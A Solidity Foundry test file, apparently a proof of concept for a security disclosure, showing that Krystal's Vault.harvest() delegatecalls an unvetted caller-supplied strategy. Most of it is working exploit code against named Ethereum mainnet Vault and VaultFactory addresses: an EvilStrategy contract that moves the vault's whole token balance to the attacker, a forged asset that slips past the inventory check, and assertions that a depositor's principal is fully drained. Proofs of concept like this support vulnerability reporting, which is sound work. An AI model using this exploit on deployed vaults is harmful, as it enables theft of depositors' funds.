// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "krystal/core/Vault.sol";
import "krystal/interfaces/core/IConfigManager.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice PoC: Vault.harvest() delegatecalls a CALLER-SUPPLIED asset.strategy address with
/// NO whitelist check (unlike allocate(), which explicitly requires
/// configManager.isWhitelistedStrategy(strategy) before delegatecalling). InventoryLib.removeAsset()
/// only validates (asset.token, asset.tokenId) against the stored inventory entry -- it never checks
/// that asset.strategy matches the entry's real .strategy field, because the mapping key is
/// (token, tokenId) only. So any onlyAuthorized caller (vaultOwner / admins[] / whitelisted
/// automator) can pass an arbitrary asset.strategy pointing at an attacker-controlled contract and
/// get the VAULT to delegatecall it -- full storage + identity takeover, drains every token the
/// vault holds. Exploitable against ANY funded vault (every vault has a principal-token inventory
/// entry, token, tokenId=0, added at initialize()/deposit() -- no Uniswap position required).
///
/// Deployed target: Vault implementation 0x964b88db9c467c34e8d5d2b1b833e8e6ae46198a (Ethereum
/// mainnet), used via EIP-1167 clones by every "Community Vault" created through VaultFactory
/// 0xff630c5d2fb9920c29c264b85e968d435f07e293. See FINDING.md for full writeup + live instances.
/// This test compiles and deploys the fetched VERBATIM verified source (no modifications).
contract MockConfigManager is IConfigManager {
  mapping(address => bool) public whitelistedStrategy;
  bool public paused;

  function maxPositions() external pure returns (uint8) {
    return 10;
  }

  function maxHarvestSlippage() external pure returns (int24) {
    return 0;
  }

  function isVaultPaused() external view returns (bool) {
    return paused;
  }

  function whitelistStrategy(address[] memory strategies, bool isWl) external {
    for (uint256 i; i < strategies.length; i++) {
      whitelistedStrategy[strategies[i]] = isWl;
    }
  }

  function isWhitelistedStrategy(address strategy) external view returns (bool) {
    return whitelistedStrategy[strategy];
  }

  function whitelistSwapRouter(address[] memory, bool) external {}

  function isWhitelistedSwapRouter(address) external pure returns (bool) {
    return false;
  }

  function whitelistAutomator(address[] memory, bool) external {}

  function isWhitelistedAutomator(address) external pure returns (bool) {
    return false;
  }

  function whitelistSigner(address[] memory, bool) external {}

  function isWhitelistSigner(address) external pure returns (bool) {
    return false;
  }

  function getTypedTokens() external pure returns (address[] memory, uint256[] memory) {
    return (new address[](0), new uint256[](0));
  }

  function getTypedToken(address) external pure returns (uint256) {
    return 0;
  }

  function setTypedTokens(address[] memory, uint256[] memory) external {}

  function isMatchedWithType(address, uint256) external pure returns (bool) {
    return false;
  }

  function getStrategyConfig(address, address) external pure returns (bytes memory) {
    return "";
  }

  function setStrategyConfig(address, address, bytes memory) external {}

  function setMaxPositions(uint8) external {}

  function setMaxHarvestSlippage(int24) external {}

  function setVaultPaused(bool _p) external {
    paused = _p;
  }

  function setFeeConfig(bool, FeeConfig memory) external {}

  function getFeeConfig(bool) external pure returns (FeeConfig memory fc) {
    // 0 platform fee, 0 vaultOwner fee -- irrelevant to this PoC (harvest() takes NO fee cut
    // path here at all; the exploit bypasses fee/share accounting entirely).
  }
}

contract FakeERC20 is IERC20 {
  string public name = "USD Coin";
  string public symbol = "USDC";
  uint8 public decimals = 6;
  uint256 public totalSupply;
  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  function transfer(address to, uint256 amt) external returns (bool) {
    balanceOf[msg.sender] -= amt;
    balanceOf[to] += amt;
    emit Transfer(msg.sender, to, amt);
    return true;
  }

  function approve(address spender, uint256 amt) external returns (bool) {
    allowance[msg.sender][spender] = amt;
    emit Approval(msg.sender, spender, amt);
    return true;
  }

  function transferFrom(address from, address to, uint256 amt) external returns (bool) {
    allowance[from][msg.sender] -= amt;
    balanceOf[from] -= amt;
    balanceOf[to] += amt;
    emit Transfer(from, to, amt);
    return true;
  }

  function mint(address to, uint256 amt) external {
    balanceOf[to] += amt;
    totalSupply += amt;
  }
}

/// @notice The attacker's "strategy" -- never whitelisted anywhere, never vetted by the platform.
/// Its fallback ignores whatever calldata Vault._harvest() encoded (IStrategy.harvest.selector +
/// args) and just runs arbitrary logic in the VAULT's storage/identity (delegatecall), then
/// returns a validly-ABI-encoded empty AssetLib.Asset[] so Vault._harvest()'s
/// abi.decode(returnData, (AssetLib.Asset[])) succeeds and the whole call completes without revert.
contract EvilStrategy {
  address public immutable token;
  address public immutable attacker;

  constructor(address _token, address _attacker) {
    token = _token;
    attacker = _attacker;
  }

  fallback() external payable {
    // address(this) == the VICTIM VAULT here (delegatecall) -- drain its entire principal balance.
    uint256 bal = IERC20(token).balanceOf(address(this));
    IERC20(token).transfer(attacker, bal);

    // return a well-formed empty AssetLib.Asset[] so Vault._harvest()'s abi.decode succeeds
    AssetLib.Asset[] memory empty = new AssetLib.Asset[](0);
    bytes memory ret = abi.encode(empty);
    assembly {
      return(add(ret, 0x20), mload(ret))
    }
  }

  receive() external payable {}
}

contract HarvestDrainTest is Test {
  Vault vault;
  MockConfigManager cm;
  FakeERC20 usdc;
  address weth = address(0xdead); // unused in this flow
  address strategist = address(0xA11CE); // the permissionless Community Vault creator/"owner"
  address depositor = address(0xB0B); // a real user trusting the strategist to manage the vault
  address attacker; // == strategist here: the vaultOwner IS onlyAuthorized by construction

  function setUp() public {
    cm = new MockConfigManager();
    usdc = new FakeERC20();
    vault = new Vault();
    attacker = strategist;

    ICommon.VaultConfig memory cfg = ICommon.VaultConfig({
      allowDeposit: true, // a public "Community Vault" -- third parties can deposit
      rangeStrategyType: 0,
      tvlStrategyType: 0,
      principalToken: address(usdc),
      supportedAddresses: new address[](0)
    });
    ICommon.VaultCreateParams memory params = ICommon.VaultCreateParams({
      name: "Krystal Community Vault",
      symbol: "kUSDC",
      principalTokenAmount: 0,
      vaultOwnerFeeBasisPoint: 0,
      config: cfg
    });

    // Mirrors VaultFactory._createVault(): initialize() called directly by "the factory"
    // (here, this test contract acting as msg.sender for initialize -- vaultOwner is set to
    // whoever calls initialize(), exactly like the real factory then transferOwnership()s to
    // the real creator). We skip that extra hop and initialize with the strategist directly
    // by pranking, matching the real deployed flow's end state (vaultOwner == strategist).
    vm.prank(strategist);
    vault.initialize(params, strategist, address(this), address(cm), weth);

    // Real depositor deposits real USDC into the strategist's public vault, trusting that
    // only platform-whitelisted strategies can ever move that principal.
    usdc.mint(depositor, 100_000e6);
    vm.startPrank(depositor);
    usdc.approve(address(vault), 100_000e6);
    vault.deposit(100_000e6, 0);
    vm.stopPrank();
  }

  function test_harvest_delegatecalls_unwhitelisted_strategy_and_drains_vault() public {
    // Sanity: the vault really holds the depositor's funds, and the "strategy" we're about to
    // use is NOT whitelisted anywhere (mirrors allocate()'s check, which we deliberately never
    // call/pass here -- this exploit route bypasses that gate entirely).
    assertEq(usdc.balanceOf(address(vault)), 100_000e6, "vault should hold depositor's principal");

    EvilStrategy evil = new EvilStrategy(address(usdc), attacker);
    assertFalse(cm.isWhitelistedStrategy(address(evil)), "attacker's contract is NOT whitelisted");

    // asset.token / asset.tokenId match the REAL principal-token inventory entry (added at
    // initialize()/deposit(), present in every funded vault) -- readable by anyone via
    // getInventory(). asset.strategy is forged to the attacker's contract. asset.amount=0 makes
    // InventoryLib.removeAsset()'s `storedAsset.amount >= asset.amount` check trivially pass
    // without even touching real accounting.
    AssetLib.Asset memory forged =
      AssetLib.Asset({ assetType: AssetLib.AssetType.ERC20, strategy: address(evil), token: address(usdc), tokenId: 0, amount: 0 });

    assertEq(usdc.balanceOf(attacker), 0, "attacker starts with nothing");

    // strategist == vaultOwner == onlyAuthorized by construction; no admin/automator
    // compromise needed. One call, no shares burned, no withdrawal fee, no allocate()
    // whitelist check anywhere on this path.
    vm.prank(strategist);
    vault.harvest(forged, 0, 0);

    assertEq(usdc.balanceOf(attacker), 100_000e6, "attacker drained the ENTIRE depositor principal");
    assertEq(usdc.balanceOf(address(vault)), 0, "vault is empty");
  }
}
